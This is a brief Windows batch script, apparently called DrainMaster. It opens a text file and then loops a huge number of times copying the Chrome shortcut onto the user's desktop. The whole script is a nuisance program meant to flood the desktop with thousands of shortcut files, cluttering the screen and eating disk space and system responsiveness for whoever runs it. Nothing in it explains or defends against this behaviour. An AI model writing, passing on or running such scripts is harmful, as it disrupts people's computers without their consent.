@echo off
start "" "\Desktop\DrainMaster\2.txt"
:loop
for /l %%x in (1,1,100000000000000000000000000000000000000000000000000000) do (
    copy "C:\Users\Public\Desktop\Google Chrome.lnk" "%USERPROFILE%\Desktop\Chrome %%x.lnk"
		
)
pause
